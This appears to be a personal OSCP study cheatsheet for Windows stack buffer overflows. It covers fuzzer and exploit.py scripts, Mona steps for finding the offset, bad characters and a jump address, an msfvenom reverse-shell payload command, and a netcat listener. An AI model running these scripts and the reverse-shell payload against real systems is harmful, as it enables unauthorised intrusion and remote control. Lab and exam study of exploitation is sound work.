---
layout: post
title: Buffer Overflow personal cheatsheet
tags: [OSCP, Buffer Overflow, Cheatsheet]
description: "Buffer Overflow personal cheatsheet"

---

- [Check Windows PE protections](#check-windows-pe-protections)
  * [Winchecksec](#winchecksec)
    + [Compiling on Windows](#compiling-on-windows)
    + [Download last release](#download-last-release)
    + [Usage](#usage)
- [Tools](#tools)
  * [Immunity Debugger](#immunity-debugger)
  * [Mona](#mona)
    + [Mona installation](#mona-installation)
- [Buffer OverFlow](#buffer-overflow)
  * [Mona Configuration](#mona-configuration)
  * [Fuzzing](#fuzzing)
  * [Crash Replication & Controlling EIP](#crash-replication---controlling-eip)
    + [Pattern](#pattern)
  * [Finding Bad Characters](#finding-bad-characters)
  * [Finding a Jump Point](#finding-a-jump-point)
  * [Generate Payload](#generate-payload)
  * [Prepend NOPs](#prepend-nops)
  * [Start nc listerner](#start-nc-listerner)

------

## Check Windows PE protections 

### Winchecksec

```
https://github.com/trailofbits/winchecksec
```

#### Compiling on Windows

```
git clone https://github.com/trailofbits/winchecksec.git
cd winchecksec
mkdir build
cd build
cmake ..
cmake --build . --config Release
```

#### Download last release

```
https://github.com/trailofbits/winchecksec/releases
```

#### Usage

```
.\Release\winchecksec.exe <PATH>.exe
```

------

## Tools

### Immunity Debugger

```
https://debugger.immunityinc.com/
```

### Mona

```
https://github.com/corelan/mona
```

#### Mona installation

```
Drop mona.py into the 'PyCommands' folder (C:\Program Files (x86)\Immunity Inc\Immunity Debugger\PyCommands\)
Install Python 2.7.14 or higher
```

------

## Buffer OverFlow

Launch Immunity Debugger, then "Open" or "Attach" the .exe file.

### Mona configuration 

Set the current working directory :

```
!mona config -set workingfolder c:\mona\%p
```

### Fuzzing 

Use fuzzer.py or fuzzer2.py, until the application crash inside Immunity Debugger.

```
# fuzzer.py

import socket, time, sys

ip = "<IP>"
port = <PORT>
timeout = 5

buffer = []
counter = 100
while len(buffer) < 30:
    buffer.append("A" * counter)
    counter += 100

for string in buffer:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        connect = s.connect((ip, port))
        s.recv(1024)
        print("Fuzzing with %s bytes" % len(string))
        s.send(string)
        s.recv(1024)
        s.close()
    except:
        print("Could not connect to " + ip + ":" + str(port))
        sys.exit(0)
    time.sleep(1)
```

```
# fuzzer2.py

import socket

target_ip = "<IP>"
target_port = <PORT>

payload = 1000 * "A"

try: 
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_ip,target_port))
    s.send(payload)
    print "[+] " + str(len(payload)) + " Bytes Sent"
except:
    print "[-] Crashed"
```

When the application crashes, EIP should be equal to 41414141 (hex value of "AAAA").

### Crash replication & controlling EIP

#### Pattern

Generate a cyclic pattern to find the exact offset of the crash :

```
# Mona
!mona pc <SIZE>

# Metasploit
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <SIZE>
```

The size must be higher than the crash offset. Now modify the "payload" variable by the cyclic pattern :

```
# exploit.py

import socket

ip = "<IP>"
port = <PORT>

prefix = ""
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(buffer + "\r\n")
    print("Done!")
except:
    print("Could not connect.")
```

Re-run the exploit, the application should crash. To find the exact offset of the crash use :

```
!mona findmsp -distance <SIZE>
```

Size is the same as the one used to create the pattern. The result should be something like :

```
EIP contains normal pattern : ... (offset XXXX)
```

Get the offset, modify in exploit.py:

- The "offset" variable by the offset
- The "retn" variable by "BBBB"
- Remove the "payload" variable

```
offset = <OFFSET>
overflow = "A" * offset
retn = "BBBB"
payload = ""
```

Re-run exploit.py, EIP should be equal to 42424242 (hex value of "BBBB"). You know control EIP !

### Finding bad characters

Certain byte characters can cause issues in the development of exploits. We must run every byte through the program to see if any characters cause issues. By default, the null byte (x00) is always  considered a bad character as it will truncate shellcode when executed.

- !mona bytearray -b "\x00" -> copy results to payload variable
- Re-run exploit.py
- !mona compare -f C:\mona\oscp\bytearray.bin -a ESP_ADDRESS -> copy bad chars
- !mona bytearray -b "\x00 + BAD_CHARS" -> copy results to payload variable
- !mona compare -f C:\mona\oscp\bytearray.bin -a ESP_ADDRESS -> Repeat the badchar comparison until the results status returns "Unmodified". This indicates that no more badchars exist.

### Finding a jump point 

```
!mona jmp -r esp -cpb "BAD_CHARS"
Choose an address and update exploit.py, setting the "retn" variable to the address, written backwards
```

or

```
!mona modules
!mona find -s "\xff\xe4" -m DLL
```

### Generate payload 

msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT EXITFUNC=thread -b "BAD_CHARS" -f py -> Copy the generated shell code setting the payload variable

### Prepend NOPs 

```
padding = "\x90" * 16
```

### Start nc listerner 

```
nc -lvp <PORT>
```

